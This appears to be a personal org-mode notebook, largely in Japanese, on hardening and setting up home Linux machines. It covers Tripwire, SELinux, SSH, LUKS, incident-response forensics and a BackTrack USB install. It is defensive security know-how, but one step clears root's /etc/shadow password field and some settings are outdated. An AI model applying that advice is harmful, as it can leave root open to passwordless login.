	   allow lvm_t kernel_t:system module_request;
	   allow lvm_t tmpfs_t:filesystem getattr;

#============= mount_t ==============
	   allow mount_t modules_dep_t:file { read open getattr };

#============= ulogd_t ==============
	   allow ulogd_t var_log_t:dir {ioctl read write getattr lock append add_name remove_name search open};
	   allow ulogd_t var_log_t:file {ioctl read write create getattr setattr lock append unlink link rename open};
****** import module
	   - # checkmodule -M -m -o mylocal.mod mylocal.te
	   - # semodule_package -o mylocal.pp -m mylocal.mod
	   - # semodule -u mylocal.pp
# check module
	   - # semodule -l

***** Tripwire
****** /etc/twcfg.txt
# 設定ファイル
	   - # orig twcfg.txt

# command after config
	   - # /usr/sbin/twadmin -m F -c tw.cfg -S site.key /etc/tripwire/twcfg.txt

# check config
	   - # /usr/sbin/twadmin -m f -c tw.cfg


# 監査対象のディレクトリでファイルの追加・削除などがあると、
# ファイルとディレクトリの変更を両方検知してしまうのを防ぐ
		 LOOSEDIRECTORYCHECKING =true
# Reportlevel
		 REPORTLEVEL = 4
# Email level
		 EMAILREPORTLEVEL = 4

****** /etc/twpol.txt
	   - # orig twpol.txt
# make policy
	   - # /usr/sbin/twadmin -m P -S site.key twpol.txt
# check policy
	   - # /usr/sbin/twadmin -m p -c tw.cfg -p tw.pol
****** create database
	   - # /usr/sbin/tripwire -m i
****** check
	   - # /usr/sbin/tripwire -m c
****** update database
	   - # /usr/sbin/tripwire -m u -c tw.cfg -p tw.pol -r <report_file>
***** chattr/lsattr
# kernel 2.6 から追加されたコマンド
# 現時点 2011 年 7 月 3 日では c,s,u オプションは ext2,ext3 には追加されていない。
****** chattr +a <logfile or historyfile>
	   - chattr +a
		 /var/log/apt/* /var/log/aptitude

****** chattr +i <File>
	   - chattr +i /bin/login
	   - chattr +iu ~/.ssh/authorized_keys
	   - chattr +iu ~/.ssh/kagi
	   - chattr +i  ~/etc/ssh/sshd_config
	   - chattr +i  /etc/network/interfaces

***** log 監査
**** emergency
	 侵入事後対策
	 - 検知
	 - コマンドファイルの hash を記録しておくなどする (保留)
	 - 緊急時用に重要コマンドを隔離保存 (保留)
	 - trace
	 - debsums でコマンドの MD5sum の検証。
	   script 作成。
	 - 本当に不正アクセスを受けているかどうか確認
	 - 対策の優先順位、対処の基準を決める
	   ネットワークケーブルを抜く基準
	   サービスの停止の基準
	   システム再構築の基準
	 - 対応手順
	   (cf. 不正アクセス調査ガイド - インシデント対応手順 - O'Reilly )
  1. インシデント情報の受信
     問題を受け付けるメールアドレス、電話、 FAX の用意
  2. 記録
     問題の記録、発生時間、対処、等
  3. 事実確認
  4. 重要度決定
     ここでサービスの停止、ケーブルの引き抜きの必要性を確認。
  5. 復旧方法の検討と手順の確認
  6. 作業開始
  7. 完了の確認
     復旧後サービスやデータが掛けていたり余計なサービスが
     開始されている場合がある。
     手順をあらかじめ決めておきテスト。
     pentest
	 8 ．原因究明 & 対策
     ポリシー等の見直し
	 - 不正アクセスの被害を受けた時点でそのコンピューターの寿命は尽きる。
	   不正アクセス者の取った行動をすべて把握できるか？
	   コンピューターを再構築しなければ安全ではない。

	 - port のオーナープロセスを調べる
	   # lsof -i
	   # netstat -p

***** 被害届け先 list
****** 日本国内
	   - [[http:www.jpcert.or.jp/][コンピューター緊急対応センター (JPCERT/CC)]]
	   - [[http:www.ipa.go.jp/][情報処理復興事業協会 (IPA)]]
	   - [[http://www.npa.go.jp/cyber/soudan.htm][都道府県警察本部のサイバー犯罪相談窓口等一覧]]
	   - [[http://www.npa.go.jp/cybersafety/][警察庁 インターネット安全・安心相談]]


	   - [[http:www.internethotline.jp][インターネット ホットラインセンター]]
****** 各国

***** 被害調査依頼先
***** 侵入調査
	  - script コマンド
	  - prompt に時刻を表示させてターミナルのログを取ると
		後に他のログとの整合性の確認に役に立つ。
	  - system の時計が正確であることを確認
	  - root でログインしない。
		侵入者にさとられログなどを強引に削除される恐れがある。
****** command file の用意
	   ls dir find cp mv cat strings w who last lastlog ps
	   su netstat lsof ifconfig lsmod insmod md5sum tail
****** rootkit 検出
	   - kstat lkm-rootkit を検出
	   - alamo-0.1a.targz lkm-rootkit を検出
	   - chkrootkit システムに仕掛けられた rootkit を検出
****** 手順
	   - PATH の確認
	   - コマンドファイルの整合性の確認
	   - ログイン記録を確認
		 w, who コマンド
		 last, lastlog コマンド
	   - network 状況確認
		 netstat -anA inet
	   - process の確認
		 /safe/ps auxwww
		 /safe/lsof
	   - インターフェースの確認
		 /safe/ifconfig -a
		 PROMISC と表示されていたらスニッファが仕掛けられてる可能性がある。
	   - su で root になる
  - (ハイフン) オプションは使わない。
	root の.bashrc などでログイン時にシステムを削除するように script が
	書かれている可能性がある。
  - cat /etc/passwd
  - システムファイルの整合性のチェック
	file
	# /safe/debsums <package>
	# /safe/rpm -Vf <file>
	# /safe/rpm -V <package>

	all
	# /safe/debsums -a
	# /safe/rpm -Va
	正常時に s オプションを付けた結果をファイルに保存して後で比較すると良い


	あるファイルがどのパッケージに含まれるか調べる
	# dpkg -S <file>
	# rpm -qf <file>

	手動で見るファイル
	/etc/inittab
	/etc/inetd.conf
	/etc/crontab
	/etc/cron.*
	/etc/rc.d/
	/etc/sysconfig/
	/etc/passwd
	/etc/shadow
	/etc/fstab
	/etc/resolv.conf
	/etc/syslog.conf

  - ファイル検索
	/safe/find / -name "..*" -ls
	/safe/find / -name ".*" -ls

	SUID, SGID
	/safe/find / -type f \( -perm -4000 -o -perm -2000 \) -ls

	所有者なし
	/safe/find / -nouser -ls

	root ユーザー, root グループ 所有
	/safe/find / -user root -ls
	/safe/find / -group root -ls

	n 日前に作成、変更されたファイル
	/safe/find / -ctime <n> -ls
	/safe/find / -mtime <n> -ls
****** log
	   message
	   dmesg
	   boot.log   モジュールやデバイスが接続されていないか確認。
	   wtmp
	   utmp

******* 手順
		chkrootkit
		chkwtmp
		chklastlog -l /var/log/lastlog -f /var/log/wtmp

**** check list
	 - [ ] マシーンルームへ立ち入らせない。
	 - [ ] [[鍵付きケース][ケースに鍵を掛ける]] BIOS 初期化対策 hdd アクセス禁止

	 - disable booting from CD, floppy, usb, and other
	 - Enable password

**** tmp
***** 事前対策
****** 攻撃/ 侵入行為
	   - パケットのフィルタリングを行い、不要なネットワークとは通信しない
	   - ユーザーアカウントやパスワードの管理は確実に行う
	   - ログを収集し、毎日チェックする。
	   - システムの整合性を毎日チェックする。
	   - バックアップを毎日行う
****** ログの改竄
	   - ログはリモートログサーバーに転送するのがよい
		 ローカルで削除されてもリモートなら削除、改竄される可能性が低い
		 NTP で時刻の同期をしっかり行う。
****** コマンドの改竄
	   - 重要なコマンドは CD,USB などに保存しておく。
	   - tripwire などで整合性を確認。
****** バックドアの設置
	   - tripwire などで整合性を確認。
	   - firewall で遮断
****** カーネルレベルでの改竄
****** ネットワークの盗聴
****** 踏み台による他のコンピュータへの攻撃
	   - ルーターなどで 23 番 port などを遮断。
****** その他
*** Service
**** SSH
***** authorized_keys
	  - # chmod 600 authorized_keys
		ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEApwapkeWLR+HDdYY3lARZScKOP8VJx8+jaQmoiiYJ4DaTRaNDXomEF2Q18/HLHe5ZFrhFNgIfcHkWrz27PYsxcgZfleqp/Qy7D/f1uLOEDNhpSu5AnNq/sbpHoQI/5XM05cOvDAG6PaPuBHZbJ2mZM1+ohZIUCySsCD+Lr7mE15+Q7dO/7Nr8MXuGBQUN63h3lGraE6q0Mf+MGf8issFD6tthSd2B3ty47BrZFPFCxr8vy4/N1aBVUwZ7+ZY9KJ7fI678Ak+fTq8QnAhAjEP73+WIKAGGcNsSJ/o3n0pRt3+7mZofVCqbpcqEJmxUKbqyinxOd01rsIqFrSZ1XKswAQ== root@localhost.localdomain

***** 設定
****** sshd_config
	   - Changing the Port (anti bruteforce from bot)
		 port 12316
	   - Disabling Password Authetication
	   - Disabling root login
	   - ChallengeResponseAuthentication no
	   - Protocol 2 only

	   - Allowusers t1
	   - X11Forwarding が必要でなければ無効
	   - sshguard
	   - Maxstartups  開始数:確率:最大数
		 ex..              2:70:5
		 認証されていない接続を 2 つまで受け付け、これを超えると 70%の確率で拒否し、 5 つを超えると全て拒否する。
	   - Cipher aes256-ctr
	   - RSAAuthentication no
****** ~/.ssh/config
	   Host ro
       User root
       Port 12317
       HostName 192.168.1.1
       IdentityFile ~/.ssh/kagi

	   Host home
       User home
       Port 12316
       HostName 192.168.1.122
       IdentityFile ~/.ssh/kagi

	   Host ki
       User t1
       Port 12316
       HostName 192.168.1.123
       IdentityFile ~/.ssh/kagi

	   Host ni
       User root
       Port 22
       IdentityFile ~/.ssh/kagi

	   Host pa
       Port 12316
       HostName 192.168.1.111
       IdentityFile ~/.ssh/kagi

	   Host pa2
       HostName 192.168.1.112
       Port 12316
       IdentityFile ~/.ssh/kagi

	   Host pa3
       HostName 192.168.1.124
       Port 12316
       User t1
       IdentityFile ~/.ssh/kagi

	   Host *
       ControlMaster auto
       ControlPath   /tmp/%r@%h:%p
       ServerAliveInterval 60
****** tmp
# Package generated configuration file
# See the sshd_config (5) manpage for details

# What ports, IPs and protocols we listen for
#Port 22
	   Port 12316
# Use these options to restrict which interfaces/protocols sshd will bind to
#ListenAddress ::
#ListenAddress 0.0.0.0
	   Protocol 2
# HostKeys for protocol version 2
	   HostKey /etc/ssh/ssh_host_rsa_key
	   HostKey /etc/ssh/ssh_host_dsa_key
#Privilege Separation is turned on for security
	   UsePrivilegeSeparation yes

# Lifetime and size of ephemeral version 1 server key
	   KeyRegenerationInterval 3600
	   ServerKeyBits 768

# Logging
	   SyslogFacility AUTH
	   LogLevel INFO

# Authentication:
	   LoginGraceTime 120
	   PermitRootLogin no
	   StrictModes yes

	   RSAAuthentication yes
	   PubkeyAuthentication yes
	   AuthorizedKeysFile	%h/.ssh/authorized_keys

# Don't read the user's ~/.rhosts and ~/.shosts files
	   IgnoreRhosts yes
# For this to work you will also need host keys in /etc/ssh_known_hosts
	   RhostsRSAAuthentication no
# similar for protocol version 2
	   HostbasedAuthentication no
# Uncomment if you don't trust ~/.ssh/known_hosts for RhostsRSAAuthentication
#IgnoreUserKnownHosts yes

# To enable empty passwords, change to yes (NOT RECOMMENDED)
	   PermitEmptyPasswords no

# Change to yes to enable challenge-response passwords (beware issues with
# some PAM modules and threads)
	   ChallengeResponseAuthentication no

# Change to no to disable tunnelled clear text passwords
	   PasswordAuthentication no

# Kerberos options
#KerberosAuthentication no
#KerberosGetAFSToken no
#KerberosOrLocalPasswd yes
#KerberosTicketCleanup yes

# GSSAPI options
#GSSAPIAuthentication no
#GSSAPICleanupCredentials yes

	   X11Forwarding yes
	   X11DisplayOffset 10
	   PrintMotd no
	   PrintLastLog yes
	   TCPKeepAlive yes
#UseLogin no

#MaxStartups 10:30:60
#Banner /etc/issue.net

# Allow client to pass locale environment variables
	   AcceptEnv LANG LC_*

	   Subsystem sftp /usr/lib/openssh/sftp-server

# Set this to 'yes' to enable PAM authentication, account processing,
# and session processing. If this is enabled, PAM authentication will
# be allowed through the ChallengeResponseAuthentication and
# PasswordAuthentication.  Depending on your PAM configuration,
# PAM authentication via ChallengeResponseAuthentication may bypass
# the setting of "PermitRootLogin without-password".
# If you just want the PAM account and session checks to run without
# PAM authentication, then enable this but set PasswordAuthentication
# and ChallengeResponseAuthentication to 'no'.
	   UsePAM yes

# disable ipv6
	   AddressFamily inet

***** security
# aptitude install sshguard
	  - パスワード認証の場合
		30 分以内にログインに５回連続ミスすると後 30 分間ログイン禁止。
		解除用パケットで１０分の制限解除オプション
		1 回に 6 分必要と考え 10000 回の認証アクセスで 60000 分かかる。
		60000 / 60  =  1000 (1000 時間)
		1000 / 24 = 41 (41 日)
		10000 通りの組み合わせで最低 41 日かかる。


	  - 100 回連続で認証に失敗したら拒否リストに追加。

	  - 公開鍵認証の場合
		パスワード認証を無効にし、パスワードで試みてきた時点で拒否リスト追加。
		解除用パケットで解除。

	  - 拒否リストに追加した IP について自動で調べる script を書く。
		whois,location,逆引きドメイン, etc..

	  - Tunneling
		外出先で通信を暗号化した状態でインターネットできるようにする。

**** repository
	 - ログイン時に zsh / emacs を update
	 - ログアウト時に、 zsh / emacs を update
***** backup & restore
	  - # svnadmin dump </path/repository> > svnbackup-`date +%Y%m%d`
	  - # svnadmin create </path/to/new_repository>
	  - # svnadmin load </path/to/new_repository> < svnbackup
		(cf. 2011 年 8 月 16 日 [[http://pentan.info/server/s_export.html][ SVN リポジトリを別のサーバに移行する方法]])

**** early boot decrypt disk (dropbear)
# copy authorized_keys
	 # cp authorized_keys /etc/initramfs-tools/root/.ssh/
	 # apt-get install dropbear

	 - static ip
	   # nano /etc/initramfs-tools/initramfs.conf
# edit "DIVICE="
# add "IP="
	   DEVICE=eth0
#  <ip_address>:<>:<gateway> : <netmask> : <hostname> : <autoconf>
	   IP=192.168.1.123::192.168.1.1:255.255.255.0:ki:eth0:off

	   (cf. [[http://www.eugenemdavis.com/set-static-ip-initramfs][Set a Static IP in Initramfs]])

	   - dropbear port & disallow password login
# edit /usr/share/initramfs-tools/script/init-premount/dropbear
		 # nano /usr/share/initramfs-tools/scripts/init-premount/dropbear
# bottom line
		 /sbin/dropbear -r /root/.ssh/id_rsa.dropbear -g -s -j -k -p 12316

		 - # update-initramfs -u
		   # update-grub

***** decrypt command
	  - # /lib/cryptsetup/askpass /bin/sh > /lib/cryptsetup/passfifo
		or # echo -n "your password" > /lib/cryptsetup/passfifo

**** sshfs
***** edit on user
	  - [[add_group][add group]]
**** SWare iron
	 - # apt-get install libXss1 libnss3-1d
	   # wget http://www.srware.net/downloads/iron.deb
	   # dpkg -i iron.deb
**** X
***** xfce
	  - # apt-get install xorg
		# apt-get install xfce4
		# apt-get install mousepad
***** mozc
	  (cf.. http://code.google.com/p/mozc/wiki/LinuxBuildInstructions)
	  - # apt-get install ca-certificates gconf2 ibus ibus-gtk ibus-qt4 im-switch libblas3gf libcurl3 libffi5 libgfortran3 libibus-qt1 libibus2 libicu44 libidn11 liblapack3gf libprotobuf6 libqt4-dbus libqt4-designer libqt4-network libqt4-qt3support libqt4-script libqt4-sql libqt4-xml libqtcore4 libqtgui4 librsvg2-common libssh2-1 libzinnia0 openssl psmisc python-cairo python-dbus python-glade2 python-gobject python-gtk2 python-ibus python-notify python-numpy python-xdg qt4-qtconfig tegaki-zinnia-japanese zenity
		# apt-get install g++ python libibus-1.0-dev libcurl4-openssl-dev libssl-dev zlib1g-dev libdbus-1-dev libglib2.0-dev libprotobuf-dev protobuf-compiler libgtest-dev subversion devscripts debhelper libqt4-dev scim libscim-dev libzinnia-dev tegaki-zinnia-japanese fakeroot
		# mkdir -p /tmp/mozc && cd /tmp/mozc
		# svn co http://mozc.googlecode.com/svn/trunk/src
		# apt-get install gyp
		# cd src
		# debuild -b -uc -us
		# cd ..
		# dpkg -i ibus-mozc*.deb mozc-server*.deb mozc-utils-gui*.deb
***** bluetooth
	  - # apt-get install bluez-utils bluez-compat
		# hcitool scan
		# hidd --search
***** flash
	  - # apt-get install flashplugin-nonfree
		# ln -s /usr/lib/flashplugin-nonfree/libflashplayer.so /usr/share/iron/flashplugin-nonfree/libflashplayer.so
*** Backup
**** policy
***** バックアップとは
	  定期的にデータを複製、保管してトラブル発生時に復旧できるように備えること

***** なぜバックアップをとるか
	  - 操作ミスによるデータ損失
	  - HDD の劣化による破損
	  - 災害による物理的損傷
***** バックアップ対象
***** バックアップメディア
***** バックアップソフト
***** バックアップ手法とサイクル
**** RAID1
	 - HDD の 1 つが壊れても動くようにする。
	   壊れた場合はメールで通達。
	   メールの優先度を高にして送信。
**** recorery
# on ni system
	 - # cryptsetup --key-file=/etc/kagi/backupfskey luksOpen /dev/sda5 backupfs_crypt
	   # mount -t ext3 /dev/mapper/backupfs_crypt /backup

*** init
**** [0/1]install
	 - [ ] [[partition1][partition]]

**** [26/30]after install
	 - [X]  [[change_locale1][change locale]]
	 - [X]  [[etc-apt-apt.conf][edit apt.conf]]
	 - [X]  [[aptitude_purge][aptitude purge]]
	 - [X]  [[apt-get_install][apt-get install]]
	 - [X]  [[change_login_shell1][change login shell]]
	 - [ ]  [[etc-default-grub.cfg][edit /etc/default/grub]]
	 - [ ]  [[/etc/grub.d1][grub の画面を標準に戻す]]
	 - [-]  [[GRUB password][Grub に password]]
	 - [X]  [[usb_mount][一般ユーザーで usb mount]]
	 - [X]  [[etc-inittab][edit inittab]]
	 - [X]  [[etc-default-rcS1][起動時、/etc/init.d/ の並列処理化]]
	 - [X]  [[etc-login.defs][edit /etc-login.defsetc/login.defs]]
	 - [X]  [[su1][su コマンドの制限]]
	 - [X]  [[sudo1][sudo ユーザー制限]]
	 - [X]  [[etc-ntp.conf][edit ntp.conf]]
	 - [X]  [[ntp-logrotate][logrotate ntp log]]
	 - [X]  [[disable_ipv61][disable ipv6]]
	 - [X]  [[etc-hosts][edit /etc/hosts]]
# log
	 - [X]  rm /etc/logrotate.d/{apt,aptitude,dpkg}
	 - [X]  [[syslog-summary1][edit /etc/logrotate.d/rsyslog]]
	 - [X]  [[etc-logrotate.d-auth][edit /etc/logrotate.d/auth]]
	 - [X]  [[etc-default-bootlogd][edit /etc/default/bootlogd]]

	 - [X]  [[remove-file-directory][remove file directory]]
	 - [X]  [[remove-login-message][remove login message]]
	 - [X]  [[security-upgrades1][edit /etc/apt/apt.conf.d/50unattended-upgrades]]
	 - [X]  mkdir /var/log/iptables && touch /var/log/iptables/iptables.log
	 - [X]  [[iptables-up1][/etc/network/if-up.d/iptables]]
	 - [X]  [[ulogd1][ulogd]]
	 - [X]  [[sysctl1][sysctl]]


	 - [ ]  [[selinux1][install selinux]]
*** TODO
	- [ ] ssh がつながらなくなった時の為の予備 remote
	- 文字コード対策
	- [ ] 起動に失敗した場合 safemode で再起動。若しくは以前のリビジョンに戻る。
	- [ ] 起動通知としてメールを送信
	- [ ] iptables 国別 DROP
	- no response arp broadcast
	- mail
	- [ ] password 認証に時間制限を付ける。
**** rpc.conf
**** libpam-shield
**** IPSEC
**** overwall
**** WOL
	 - できれば BIOS を弄りたい。
	   パケット次第でデュアルブートできるように。
	   起動に失敗した場合、保守用の OS でメンテナンスをする。
**** Remote shutdown
	 - kernel レベルで外部からワンパケットで shutdown/reboot できるようにする。
	   中途半端な起動になってしまった場合を考えて。
	   できるなら BIOS レベルとカーネルレベル兼用が良い。
	   BIOS は強制終了と reboot
	   kernel は強制終了と shutdown/reboot
**** server 運用記録
**** Exchange Server
***** Sendmail
***** Calender
***** 連絡先

***** open-xchange server
	  - # nano /etc/apt/sources.list
		deb http://ftp.riken.jp/Linux/debian/debian/ squeeze main non-free
		deb-src http://ftp.riken.jp/Linux/debian/debian/ squeeze main non-free

		deb http://security.debian.org/ squeeze/updates main non-free
		deb-src http://security.debian.org/ squeeze/updates main non-free

		deb http://software.open-xchange.com/OX6/stable/DebianSqueeze/ /

	  - # wget http://software.open-xchange.com/oxbuildkey.pub -O - | apt-key add -
		# apt-key list

	  - # apt-get update

**** Network Boot Server (ターミナルサーバー LTSP)
	 - Mirroring しているクライアントを外部で起動
	   もしくは、 USB 用を起動。
	   すなわち、クライアントをシンクライアントとして使う。

**** 監視カメラ配備 (優先度:低)
	 - 外部からも見れるようにする。
	 - 映像を 1 週間ほど保存しておく。

**** GPS
	 - 移動を記録＆距離計算＆時間計算

**** 安定維持の為の監視
	 - 温度を監視 過度な温度にならない為に CPU を制御。熱くなりすぎたらメールで異常を送信。
	 - ハードディスクの健康監視
	   smartd

**** Pentest
***** Rainbow Crack
	  - Install rainbow crack soft
	  - Get Rainbow Table
***** Password Crack
**** ブラウザの閲覧履歴をサーバーに保存。
	 - あとで検索しやすいようにする。

**** Mirroring
	 - クライアント PC をミラーリングする。
	   仮想環境になると思う。

**** ACLs
**** IT 関係の法律をすべて列挙
	 判例も列挙する。

     [[file:~/Doc/architecture/server::*Security]]
     <2011-07-26 Tue>

**** gathering white_paper
	 gather another country's white_paper

     [[file:~/mydoc/architecture/server::*Infomation%20Gathering][file:~/mydoc/architecture/server::*Infomation Gathering]]
     <2011-08-02 Tue>

**** ntp.conf restrict script
	 ip address is offen chenged.
	 generate current ip address by like nslookup.
	 todo write script

     [[file:~/Doc/architecture/server::*ntpd]]
     <2011-07-17 Sun>
** NI
   [usb:ni (knight)]

*** USB Device
	- Express DUO USB 3.0 ST3U32EDB [32GB]]
	  型番  : ST3U32EDB
	  容量  : 32GB
	  (cf. http://www.supertalent.com/products/stt_usb_detail.php%3Ftype%3DExpress%20DUO][http://www.supertalent.com/products/stt_usb_detail.php?type=Express%20DUO )
	  (cf. [[file:/data/archive/reference/manual/Express_DUO_USB_3.0_ST3U32EDB_%5B32GB%5D.pdf][data_sheet.pdf]])

	- usb 自体を暗号化。
      起動時に認証を求める。
      ログインは自動。
	  remote 接続時の認証に注意。

*** Install
	(cf. http://www.infosecramblings.com/backtrack/backtrack-5-bootable-usb-thumb-drive-with-full-disk-encryption/)

	- # /etc/init.d/networking start
	  # startx
***** Partition
	  32GB
	  - /boot   200M   ext3
	  - swap      1G
	  - /        MAX   ext3

****** # fdisk /dev/sdxx
# delete existing partitions. There may be more than one.

	   Command (m for help): d
	   Partition number (1-4): 1

# create the first partition

	   Command (m for help): n
	   Command action
	   e    extended
	   p    primary partition (1-4)
	   p
	   Partition number (1-4): 1
	   First cylinder (<n>-<n>, default 1): <enter>
	   Using default value <n>
	   Last cylinder, +cylinders or +size{K,M,G} (<n>-<n>, default
	   2022): +200M

# create partition for swap
	   Command (m for help): n
	   Command action
	   e    extended
	   p    primary partition (1-4)
	   p
	   Partition number (1-4): 2
	   First cylinder (<n>-<n>, default <n>): <enter>
	   Using default value <n>
	   Last cylinder, +cylinders or +size{K,M,G} (<n>-<n>, default
	   <n>): +1G

#create the extended partition
	   Command (m for help): n
	   Command action
	   e    extended
	   p    primary partition (1-4)
	   e
	   Partition number (1-4): 3
	   First cylinder (<n>-<n>, default <n>): <enter>
	   Using default value <n>
	   Last cylinder, +cylinders or +size{K,M,G} (<n>-<n>, default
	   <n>): <enter>
	   Using default value <n>

# Create the logical partition.

	   Command (m for help): n
	   Command action
	   l     logical (5 or over)
	   p    primary partition (1-4)
	   l
	   First cylinder (<n>-<n>, default <n>): <enter>
	   Using default value <n>
	   Last cylinder, +cylinders or +size{K,M,G} (<n>-<n>, default
	   <n>): <enter>
	   Using default value <n>

# Setting the partition type for the first partition to ext3

	   Command (m for help): t
	   Partition number (1-4): 1
	   Hex code (type L to list codes): 83

# Setting the first partition active

	   Command (m for help): a
	   Partition number (1-4): 1

	   Command (m for help): w

***** Prepare
# Do not "apt-get update && apt-get install hashalot"
	  - # apt-get update
		# apt-get install hashalot
***** crypt
	  - # dd if=/dev/urandom of=/dev/sda5
		# cryptsetup --cipher "aes-cbc-essiv:sha256" --key-size 256 --verify-passphrase luksFormat /dev/sda5
		# cryptsetup luksOpen /dev/sda5 btcrypt
***** make file system
	  - # mkfs.ext4 /dev/mapper/btcrypt

***** start install script
# chose /dev/sda1 /boot
# chose /dev/mapper/btcrypt /
# ignore swap error
***** check UUID
	  - # blkid /dev/sda5
# copy UUID

***** chroot
	  - # mkdir /mnt/bt
		# mount /dev/mapper/btcrypt /mnt/bt
		# mount /dev/sda1 /mnt/bt/boot
		# chroot /mnt/bt
		# mount -t proc proc /proc
		# mount -t sysfs sys /sys

      # Do not "apt-get update && apt-get install hashalot"
	  - # apt-get update
		# apt-get install hashalot

	  - # nano /etc/crypttab
		btcrypt      /dev/disk/by-uuid/<uuid from above>  none  luks

	  - # cat /etc/fstab
		/dev/mapper/btcrypt / ext4  defaults 0 1

	  - # update-initramfs -u

***** make crypt swap after reboot
	  (cf. [[http://oldsite.debianhelp.org/book/export/html/1116][Booting Cryptsetup-LUKS Encrypted boot from USB Stick]])

	  - # dd if=/dev/urandom of=/dev/sda2
		# mkdir /etc/kagi
		# hashalot -s whateversaltphraseyouwanttouse -x sha256 > /etc/kagi/swapkey
		# chmod 400 /etc/kagi/swapkey
		# cryptsetup --verbose --cipher aes-cbc-essiv:sha256 --key-size 256 --verify-passphrase luksFormat /dev/sda2
		# blkid /dev/sda2
# copy uuid
		# cryptsetup create swap /dev/disk/by-uuid/<paste uuid> -d /etc/kagi/swapkey -c  aes-cbc-essiv:sha256 -h sha512
		# mkswap /dev/mapper/swap

# edit /etc/crypttab
		# nano /etc/crypttab
# add for crypt swap
		swap /dev/disk/by-uuid/<paste uuid> /etc/kagi/swapkey cipher=aes-cbc-essiv:sha256,hash-sha512,swap

# edit /etc/fstab before /dev/cdrom line
		# nano /etc/fstab
		/dev/mapper/swap none swap sw 0 0

*** Boot
**** grub
- wget -c https://launchpad.net/grub-customizer/3.0/3.0.4/+download/grub-customizer_3.0.4.tar.gz
  tar -xf grub-customizer_3.0.4.tar.gz
  cmake .
  make
  make install

**** /etc/rc?.d/
	 - # mv /etc/rc2.d/S20tor /etc/rc2.d/K20tor
	   # mv /etc/rc2.d/S20privoxy /etc/rc2.d/K20privoxy
	   # mv /etc/rc4.d/S50pulseaudio /etc/rc4.d/K80pluseaudio
	   # update-rc.d polipo disable
	   # update-rc.d dns-clean disable
	   # update-rc.d rsync disable
*** General
**** OS
	 - Backtrack 5
**** Host Name
	 - ni
	   (knight - king の ki と knight の kn が見間違いやすいので ni)
	   (cf. [[file:how_to_define_hostname][define_host_name]])
**** root パスワード無効
	 - /etc/shadow root の 2 つ目を削除

*** Setting Files

*** action
**** connect network
	 [[file:~/mydoc/linux/etc/connect_network.org][connect_network]]

*** tmp
	"Wrong number of arguments: called-interactively-p, 1"
	add-apt-repository ppa:ubuntu-elisp/ppa
	apt-get update
	apt-get upgrade

** QU
   [desktop:qu (queen)]

*** Device
## PC 内部を弄る時は静電気対策で水で 30 秒間洗う。
## 自分の体をアースさせておく。
## 静電気防止手袋を使う。
**** PC ケース
- PC ケースは保守しやすいものを考慮
  具体的に HDD が取り出しやすいこと、
  コードが整理しやすい配置であること、
  ケースが開けやすいこと、
  掃除がしやすいこと。
- 鍵がかけられる。
- 埃対策の為にファンレスの物を検討。
*** Boot
**** BIOS
- CD/FDD/USB からの起動を禁止。
- Password 設定。
**** Bootloader
	 - /boot/grub/grub.cfg
**** runlevel
**** autologin
$ mkdir /etc/systemd/system/getty@tty1.service.d

/etc/systemd/system/getty@tty1.service.d/autologin.conf
[Service]
ExecStart=
ExecStart=-/sbin/agetty --autologin *username* --noclear %I 38400 linux

*** General
**** OS
- Distribution: Linux Debian 6 sqeeze
- kernel:       linux 2.6 i686
****** module
- expert install で汎用化を選択
**** Partition
	 :PROPERTIES:
	 :SUMMARY:  partition2
	 :END:

## デスクトップ用途で使う。
## /tmp, /home, /var/tmp などの一般ユーザーが書き込める領域は
## "/" のリソースを圧迫する可能性があるので分けた方がよい。

## RAID1
## System 30G

## アクセスの多いパーティションはディスクの先頭 (外側) に配置
## パーティションは作った順番で外側から配置される。 (cf.2011 年 7 月 15 日 FreeBSD ハンドブック [[http://www.freebsd.org/doc/ja/books/nandbook/configtuning-initial.html][初期設定]]) (cf. 2011 年 7 月 15 日 [[http://codecraft.jp/tips/index.php?Linux%2F%A5%D1%A1%BC%A5%C6%A5%A3%A5%B7%A5%E7%A5%F3%CA%AC%B3%E4%CE%E3][ Linux/ パーティション分割例 - CodeCraft tips]])

[[file:/data/archive/reference/etc/partition_info_for_server/partition_architecture_memo.pdf][partition_memo.pdf]]

Western digital: 500G  | Win | Windata | server | data |
Hitachi        : 500G  |            Raid 1             |
Western digital: 250G  | winB | temp |  swap  | backup |

- /boot           200M    ext3
# server partition 30G LVM
- /var              6G    ext3   defaults,nodev
- /                 4G    ext3
- /usr              6G    ext3   defaults,nodev
- /usr/local      1.5G    ext3   defaults,nodev
- /home             6G    ext3
- /tmp            6.5G    ext3   defaults,nosuid,noexec,nodev 0 2

cf. [[http://www.debian.org/releases/stable/i386/apcs02.html.ja][Debian GNU/Linux インストールガイド- C.2. ディレクトリツリー]]
cf. [[http://www.debian.org/releases/stable/i386/apcs03.html.ja][Debian GNU/Linux インストールガイド- C.3. お勧めするパーティションルール]]

**** Host Name
- queen
# 命名規則は RFC1178 を参照。
# 一覧にしたときに見やすいように文字数を統一する。文字は 8 文字以内がよい。
# よく使われている用語を使わない。会話によくでてくるものは、どちらであるか判断がつかなくなる。
# 一台のマシンと同じ名にしてはいけない。 shop1,shop2,shop3 などと区別を数字だけすると台数が増えると煩わしくなる。
# 自分や人物の名前を付けない。会話の中で判断がつかなくなる。
# 違う綴りを使うな。綴りをわざと変えると英語の苦手な人にとって混乱を招く。
# ドメイン名を避ける。
# 数字で始まる名前を付けない。
# 大文字を使うな。

# ホスト名から機器がわかること。
# ホスト名から役割がわかること。
[候補]
- 天体
- 任天堂のキャラクター マリオ、ゼルダ、ポケモン、カービー、など役割に合わせてソフトを分ける。
- 元素名
- チェス (自宅ネットワーク用)
  King = Main server, Queen = Desktop, Bishop = laptop,
  Knight = USB, Rook = router, Pawn = テスト機
  Pawn には名前が付いている。 rook's Pawn,knight's Pawn,Bishop's Pawn,Queen's Pawn,King's Pawn
- 行政機関
  naikaku = Main Server, soumu = Mail Server, bouei = Router,
  zaimu = Data Server, monbu = Media Server, ...
  # 行政機関は長い目で見ると再編されることがあるので注意。
- 鳥の名前
*** Negative list
- BIOS のパスワードは簡単に解除できるので悪戯防止程度と考えておく。
*** memo
**** install 手順
- 最小構成で install en-utf
- xorg xfce4  xfce4-terminal
  chromium-browser chromium-browser-l10n
  emacs zsh subversion
  sudo xdg-user-dirs-gtk

**** setting
- # LANG=C xdg-user-dirs-gtk
***** sysctl.conf
net.core.rmem_max = 16777216
net.core.wmem_max = 16777216 

net.ipv4.tcp_wmem = 4096 87380 16777216
net.ipv4.tcp_rmem = 4096 87380 16777216 

